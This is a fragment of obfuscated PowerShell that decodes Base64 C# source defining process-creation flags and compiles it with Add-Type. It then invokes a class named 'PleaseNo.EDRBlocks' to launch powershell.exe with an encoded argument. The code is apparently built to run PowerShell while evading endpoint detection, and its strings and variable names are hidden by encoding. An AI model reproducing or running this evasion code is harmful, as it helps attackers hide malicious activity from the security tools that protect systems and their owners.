AaQBjACAAZQBuAHUAbQAgAEMAcgBlAGEAdABpAG8AbgBGAGwAYQBnAHMAIAA6ACAAdQBpAG4AdAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABDAHIAZQBhAHQAZQBTAHUAcwBwAGUAbgBkAGUAZAAgAD0AIAAwAHgAMAAwADAAMAAwADAAMAA0ACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARABlAHQAYQBjAGgAZQBkAFAAcgBvAGMAZQBzAHMAIAA9ACAAMAB4ADAAMAAwADAAMAAwADAAOAAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwAgAD0AIAAwAHgAMAA4ADAAMAAwADAAMAAwACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARQB4AHQAZQBuAGQAZQBkAFMAdABhAHIAdAB1AHAASQBuAGYAbwBQAHIAZQBzAGUAbgB0ACAAPQAgADAAeAAwADAAMAA4ADAAMAAwADAALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABDAHIAZQBhAHQAZQBOAGUAdwBDAG8AbgBzAG8AbABlACAAPQAgADAAeAAwADAAMAAwADAAMAAxADAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgAH0A')))
Add-Type -TypeDefinition ${/===\________/==\}
[PleaseNo.EDRBlocks]::Main($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAVwBJAE4ARABPAFcAUwBcAFMAeQBzAHQAZQBtADMAMgBcAFcAaQBuAGQAbwB3AHMAUABvAHcAZQByAFMAaABlAGwAbABcAHYAMQAuADAAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUA'))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABhAHIAZwB1AG0AZQBuAHQA'))))
}
